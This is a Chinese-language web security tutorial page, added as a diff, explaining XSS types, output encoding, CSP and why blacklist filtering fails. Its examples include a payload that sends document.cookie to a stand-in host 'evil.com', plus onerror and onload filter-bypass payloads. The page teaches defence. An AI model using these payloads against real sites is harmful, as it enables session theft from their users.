@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>XSS 跨站脚本攻击原理与防御 — Web 安全</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: "PingFang SC", "Microsoft YaHei", sans-serif; background: #0f1117; color: #e2e8f0; padding: 48px 20px 80px; line-height: 1.8; }
+  .page { max-width: 720px; margin: 0 auto; }
+  .breadcrumb { font-size: 0.78rem; color: #334155; margin-bottom: 32px; }
+  .breadcrumb a { color: #475569; text-decoration: none; } .breadcrumb a:hover { color: #94a3b8; }
+  .hero { margin-bottom: 40px; }
+  .hero .tag { font-size: 0.72rem; border: 1px solid; border-radius: 4px; padding: 2px 8px; margin-bottom: 12px; display: inline-block; }
+  .hero h1 { font-size: 1.6rem; font-weight: 700; color: #f1f5f9; margin-bottom: 8px; }
+  .hero p { color: #64748b; font-size: 0.9rem; }
+  h2 { font-size: 1rem; font-weight: 600; margin: 40px 0 16px; padding-left: 12px; border-left: 3px solid; }
+  h3 { font-size: 0.9rem; font-weight: 600; color: #94a3b8; margin: 24px 0 10px; }
+  p { color: #94a3b8; font-size: 0.9rem; margin-bottom: 12px; } strong { color: #e2e8f0; }
+  .code-block { background: #1e2030; border: 1px solid #2d3148; border-radius: 10px; overflow: hidden; margin: 16px 0; }
+  .code-block .cb-header { display: flex; align-items: center; justify-content: space-between; padding: 8px 16px; background: #252840; border-bottom: 1px solid #2d3148; font-size: 0.72rem; color: #475569; }
+  .code-block pre { padding: 16px; overflow-x: auto; font-size: 0.85rem; line-height: 1.7; font-family: "Fira Code","Cascadia Code",Consolas,monospace; }
+  .kw{color:#c084fc} .ty{color:#60a5fa} .str{color:#86efac} .num{color:#fbbf24}
+  .com{color:#64748b} .fn{color:#60a5fa} .punct{color:#475569} .var{color:#e2e8f0} .ann{color:#f87171}
+  .callout { border-radius: 8px; padding: 14px 16px; font-size: 0.85rem; margin: 16px 0; border-left: 3px solid; }
+  .callout.info { background: #172554; border-color: #3b82f6; color: #93c5fd; }
+  .callout.warn { background: #422006; border-color: #f97316; color: #fdba74; }
+  .callout.tip  { background: #1f3528; border-color: #4ade80; color: #86efac; }
+  table { width: 100%; border-collapse: collapse; font-size: 0.85rem; margin: 16px 0; }
+  th { background: #252840; color: #94a3b8; font-weight: 600; padding: 10px 14px; text-align: left; border: 1px solid #2d3148; }
+  td { padding: 9px 14px; border: 1px solid #1e2030; color: #94a3b8; vertical-align: top; }
+  tr:nth-child(even) td { background: #13151f; }
+  td code, th code { background: #2d3148; padding: 1px 5px; border-radius: 3px; font-family: Consolas,monospace; font-size: 0.82rem; color: #e2e8f0; }
+  p code, li code { background: #1e2030; border: 1px solid #2d3148; padding: 1px 6px; border-radius: 4px; font-family: Consolas,monospace; font-size: 0.82rem; }
+  hr { border: none; border-top: 1px solid #1e2030; margin: 40px 0; }
+  ul, ol { color: #94a3b8; font-size: 0.9rem; margin: 12px 0 12px 24px; } li { margin-bottom: 6px; }
+  .tree { font-family: "Fira Code",Consolas,monospace; font-size: 0.82rem; color: #64748b; background: #1e2030; border: 1px solid #2d3148; border-radius: 8px; padding: 16px 20px; margin: 16px 0; line-height: 1.9; }
+  .nav-footer { display: flex; justify-content: space-between; align-items: center; margin-top: 60px; padding-top: 24px; border-top: 1px solid #1e2030; }
+  .nav-btn { font-size: 0.82rem; color: #475569; text-decoration: none; padding: 8px 16px; border: 1px solid #2d3148; border-radius: 6px; transition: all 0.15s; }
+  .nav-btn:hover { color: #94a3b8; border-color: #475569; }
+
+  /* 主题色补丁 */
+  .tree .hi { color: #fb923c; }
+  p code, li code { color: #fb923c; }
+  h2 { color: #fb923c; border-left-color: #fb923c; }
+  .hero .tag { color: #fb923c; border-color: #7c4a10; }
+  .nav-btn.next { color: #fb923c; border-color: #7c4a10; }
+</style>
+</head>
+<body>
+<div class="page">
+
+  <!-- 面包屑 -->
+  <div class="breadcrumb">
+    <a href="../security-roadmap.html">Web 安全 路线图</a> / 常见攻击 / XSS 跨站脚本攻击原理与防御
+  </div>
+
+  <!-- Hero -->
+  <div class="hero">
+    <div class="tag">常见攻击</div>
+    <h1>XSS 跨站脚本攻击原理与防御</h1>
+    <p>浏览器分不清"这段 JS 是网站自己写的"还是"攻击者硬塞进网页里的"——只要代码出现在页面里，浏览器就会一视同仁地执行它。这正是 XSS 存在的根本原因。</p>
+  </div>
+
+  <!-- 是什么 -->
+  <h2>XSS 是什么，为什么可能发生</h2>
+  <p>
+    <strong>XSS（Cross-Site Scripting，跨站脚本攻击）</strong>指攻击者想办法把一段恶意 JavaScript 注入到目标网页中，
+    当受害者的浏览器加载这个页面时，这段脚本会被当作"网站自己的代码"一样正常执行——从而可以读取 <code>document.cookie</code>、
+    劫持会话、篡改页面内容、伪造用户操作等。
+  </p>
+  <p>
+    根本原因在于浏览器的信任模型：<strong>浏览器不区分"网站开发者写的 JS"和"攻击者想办法混进 HTML 里的 JS"</strong>，
+    只要这段 `&lt;script&gt;` 标签出现在了这个源（origin）返回的页面里，浏览器就认为它是可信的，会带着当前站点的 Cookie、
+    Session 等身份信息去执行。换句话说，<strong>XSS 的本质是"数据"被当成了"代码"来执行</strong>——用户输入的评论、搜索词、
+    URL 参数本应该是纯文本数据，但如果网站没有正确处理，浏览器的 HTML 解析器会把其中形如 `&lt;script&gt;` 的部分误当成可执行代码。
+  </p>
+  <div class="callout info">
+    <strong>类比：</strong>就像一家餐厅只检查"这道菜是不是从后厨端出来的"，却不检查"后厨的食材是不是被人偷偷调过包"——
+    只要脏东西混进了后厨的正常出菜流程，餐厅照样会把它当成自己的菜端给顾客。浏览器对脚本的信任也是同理：只认"是否出现在页面里"，不认"谁写的"。
+  </div>
+
+  <!-- 三种类型 -->
+  <h2>三种类型：存储型 / 反射型 / DOM 型</h2>
+
+  <h3>1. 存储型 XSS（Stored XSS）</h3>
+  <p>
+    攻击者提交的恶意脚本被<strong>持久化保存到服务器（数据库）</strong>中，之后每一个访问该页面的用户都会加载并执行这段脚本。
+    因为"存起来了"、"影响所有查看者"，这是三种类型里<strong>危害最大</strong>的一种。
+  </p>
+  <div class="code-block">
+    <div class="cb-header"><span>示例：评论区未过滤直接入库</span></div>
+    <pre><span class="com">// 攻击者在评论框里提交了这样一段内容，服务端原样存入数据库</span>
+<span class="com">// 之后每个打开这篇文章、加载评论列表的用户都会执行它</span>
+&lt;<span class="kw">script</span>&gt;<span class="fn">fetch</span>(<span class="str">'https://evil.com/steal?c='</span>+<span class="var">document</span>.<span class="var">cookie</span>)&lt;/<span class="kw">script</span>&gt;</pre>
+  </div>
+  <p>只要有人打开这条评论所在的页面，浏览器就会自动把当前用户的 Cookie 发送到攻击者的服务器——受害者完全无感知。</p>
+
+  <h3>2. 反射型 XSS（Reflected XSS）</h3>
+  <p>
+    恶意脚本<strong>藏在 URL 参数里</strong>，服务器接收到请求后把这个参数原样"反射"回页面中显示出来。
+    它不会被存储，<strong>必须诱导受害者点击一个精心构造的链接</strong>才能触发，是"一次性"的攻击。
+  </p>
+  <div class="code-block">
+    <div class="cb-header"><span>示例：搜索页面直接回显查询词</span></div>
+    <pre><span class="com">// 页面逻辑大致是：您搜索的是：{q参数原样输出}</span>
+<span class="com">// 正常使用：https://site.com/search?q=java</span>
+<span class="com">// 攻击者精心构造并发给受害者的链接：</span>
+https://site.com/search?q=&lt;<span class="kw">script</span>&gt;<span class="fn">fetch</span>(<span class="str">'https://evil.com/steal?c='</span>+<span class="var">document</span>.<span class="var">cookie</span>)&lt;/<span class="kw">script</span>&gt;</pre>
+  </div>
+  <p>受害者点击这个看似正常的搜索链接后，服务器把 <code>q</code> 参数原样嵌入返回的 HTML，脚本随即在受害者浏览器中执行。</p>
+
+  <h3>3. DOM 型 XSS（DOM-based XSS）</h3>
+  <p>
+    整个攻击链<strong>完全发生在浏览器端的 JavaScript 里</strong>，从头到尾没有经过服务器渲染或响应——
+    典型场景是前端代码直接读取 <code>location.hash</code>、<code>location.search</code> 等用户可控的数据，
+    未经处理就写入 <code>innerHTML</code>。因为服务器根本没参与这个数据流转过程，<strong>服务端做再多过滤也拦不住</strong>。
+  </p>
+  <div class="code-block">
+    <div class="cb-header"><span>示例：前端 JS 直接用 hash 拼 innerHTML</span></div>
+    <pre><span class="com">// 页面自己的 JS 代码（没有经过任何服务器交互）</span>
+<span class="kw">const</span> <span class="var">name</span> = <span class="var">location</span>.<span class="var">hash</span>.<span class="fn">slice</span>(<span class="num">1</span>); <span class="com">// 取 #后面的内容</span>
+<span class="var">document</span>.<span class="fn">getElementById</span>(<span class="str">'greeting'</span>).<span class="var">innerHTML</span> = <span class="str">'你好，'</span> + <span class="var">name</span>;
+
+<span class="com">// 攻击者发送链接：https://site.com/#&lt;img src=x onerror=alert(document.cookie)&gt;</span>
+<span class="com">// location.hash 被直接拼进 innerHTML，浏览器解析出 img 标签并触发 onerror</span></pre>
+  </div>
+
+  <!-- 对比表 -->
+  <h2>三种类型对比</h2>
+  <table>
+    <thead>
+      <tr><th>类型</th><th>触发位置</th><th>是否持久化</th><th>到达受害者的方式</th><th>危险程度</th></tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>存储型</strong></td>
+        <td>服务端数据库</td>
+        <td>是，持久保存</td>
+        <td>受害者正常访问被污染的页面即可中招，无需额外诱导</td>
+        <td>最高——影响所有访问者</td>
+      </tr>
+      <tr>
+        <td><strong>反射型</strong></td>
+        <td>服务端响应（URL 参数回显）</td>
+        <td>否，一次性</td>
+        <td>需诱导受害者点击精心构造的链接</td>
+        <td>中——依赖社工诱导</td>
+      </tr>
+      <tr>
+        <td><strong>DOM 型</strong></td>
+        <td>纯前端 JS（不经过服务器）</td>
+        <td>否，一次性（但也可能配合存储型出现）</td>
+        <td>诱导点击链接，或页面自身逻辑触发</td>
+        <td>中高——服务端过滤完全无效</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <!-- 防御 -->
+  <h2>防御核心：输出编码 / 转义</h2>
+  <p>
+    防御 XSS 的核心思路只有一句话：<strong>把用户输入永远当作"要展示的数据"，绝不当作"要执行的代码"</strong>。
+    具体手段是<strong>输出编码（Output Encoding）</strong>——在把用户数据渲染进页面之前，把可能被解析成标签/脚本的特殊字符转换成无害的实体。
+  </p>
+  <div class="code-block">
+    <div class="cb-header"><span>HTML 实体编码示例</span></div>
+    <pre><span class="com">// 原始输入（攻击者提交的内容）</span>
+&lt;<span class="kw">script</span>&gt;<span class="fn">alert</span>(<span class="num">1</span>)&lt;/<span class="kw">script</span>&gt;
+
+<span class="com">// 编码后再输出到页面，浏览器只会把它当成纯文本显示，不会解析执行</span>
+&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;
+
+<span class="com">// 关键字符对照：</span>
+<span class="com">// <  →  &lt;      >  →  &gt;      "  →  &quot;      '  →  &#x27;      &  →  &amp;</span></pre>
+  </div>
+  <p>
+    需要特别注意：<strong>编码方式要跟"输出上下文"匹配</strong>，同一份用户数据出现在不同位置，需要的转义规则完全不同：
+  </p>
+  <table>
+    <thead>
+      <tr><th>输出上下文</th><th>需要的编码方式</th><th>示例</th></tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>HTML 标签内容</td>
+        <td>HTML 实体编码</td>
+        <td><code>&lt;div&gt;{编码后的内容}&lt;/div&gt;</code></td>
+      </tr>
+      <tr>
+        <td>HTML 属性值</td>
+        <td>属性专用编码（连空格、等号都要转义）</td>
+        <td><code>&lt;input value="{编码后的内容}"&gt;</code></td>
+      </tr>
+      <tr>
+        <td>JS 字符串内</td>
+        <td>JS 字符串转义（转义引号、反斜杠、`&lt;/script&gt;`）</td>
+        <td><code>var x = "{JS编码后的内容}";</code></td>
+      </tr>
+      <tr>
+        <td>URL 参数</td>
+        <td>URL 编码（<code>encodeURIComponent</code>）</td>
+        <td><code>?redirect={URL编码后的内容}</code></td>
+      </tr>
+    </tbody>
+  </table>
+  <p>
+    现代前端框架（React/Vue）默认对插值内容做 HTML 转义，这也是"用 <code>{{ }}</code> 或 JSX 表达式渲染比手拼 HTML 字符串更安全"的原因；
+    但一旦使用 <code>dangerouslySetInnerHTML</code>、<code>v-html</code> 这类"绕过转义"的 API，防护就失效了，必须自己额外做净化处理。
+  </p>
+
+  <!-- CSP -->
+  <h2>纵深防御：CSP（Content-Security-Policy）</h2>
+  <p>
+    输出编码是第一道防线，但不可能保证所有代码路径都万无一失，因此需要<strong>纵深防御（Defense in Depth）</strong>——
+    CSP 是一种由服务器下发、浏览器强制执行的安全策略，通过 HTTP 响应头告诉浏览器"本页面只允许执行来自哪些来源的脚本"。
+  </p>
+  <div class="code-block">
+    <div class="cb-header"><span>响应头示例</span></div>
+    <pre>Content-Security-Policy: script-src 'self' https://trusted-cdn.com
+
+<span class="com">// 含义：只信任本站(self)和指定 CDN 加载的脚本</span>
+<span class="com">// 即使攻击者成功注入 <script>...</script>，浏览器也会拒绝执行内联脚本</span>
+<span class="com">// 因为它既不是 'self' 也不在白名单里——注入成功了，但脚本跑不起来</span></pre>
+  </div>
+  <p>
+    这就是"纵深防御"的价值：<strong>即便某处输出编码没做好导致注入成功，CSP 依然能在浏览器执行层拦下这一刀</strong>，
+    大大降低了 XSS 真正造成损害的概率。
+
+  </p>
+
+  <!-- 常见坑 -->
+  <h2>常见误区</h2>
+  <div class="callout warn">
+    <strong>误区：只靠黑名单过滤关键字就能防住 XSS。</strong>
+    比如简单地把输入中的 <code>script</code> 字符串替换成空——这种"过滤输入"的思路极易被绕过：
+    攻击者可以完全不用 <code>&lt;script&gt;</code> 标签，例如 <code>&lt;img src=x onerror=alert(1)&gt;</code>、
+    <code>&lt;svg onload=alert(1)&gt;</code>，还可以用大小写混写（<code>&lt;ScRiPt&gt;</code>）、
+    双重编码等方式绕过黑名单。<strong>正确的心智模型是"输出时转义"而不是"输入时过滤"</strong>——
+    不管输入里有没有危险字符，只要在把它渲染到页面的那一刻做对了上下文相关的编码，注入就不可能生效。
+  </div>
+
+  <div class="callout tip">
+    <strong>面试高频：</strong>"XSS 和 CSRF 有什么区别？" 这是一道经典对比题——核心区别在于<strong>代码执行在哪、以谁的名义发出请求</strong>。
+    XSS 是攻击者的代码在受害者浏览器里真正跑了起来；CSRF 则是攻击者的代码根本没在受害者浏览器里执行过一行，
+    只是"借用"了浏览器自动携带 Cookie 的机制伪造了一个请求。下一篇 <code>CSRF 跨站请求伪造原理与防御</code> 会展开讲这个对比。
+  </div>
+
+  <!-- 核心价值总结 -->
+  <h2>核心价值总结</h2>
+  <ul>
+    <li><strong>XSS 的本质是"数据被当成代码执行"</strong>——浏览器无法区分网站自己的脚本和被注入的脚本。</li>
+    <li><strong>存储型最危险（持久化、影响所有人），反射型靠诱导点击，DOM 型服务端完全看不见</strong>，三者触发路径不同但根因一致。</li>
+    <li><strong>防御的正确姿势是"输出时按上下文转义"，而不是"输入时靠黑名单过滤"</strong>，CSP 作为浏览器层面的纵深防御兜底。</li>
+  </ul>
+
+  <hr />
+
+  <!-- 导航 -->
+  <div class="nav-footer">
+    <a href="../basics/02-威胁建模的基本思路.html" class="nav-btn">← 威胁建模的基本思路</a>
+    <a href="./02-CSRF跨站请求伪造原理与防御.html" class="nav-btn next">CSRF 跨站请求伪造原理与防御 →</a>
+  </div>
+
+</div>
+</body>
+</html>
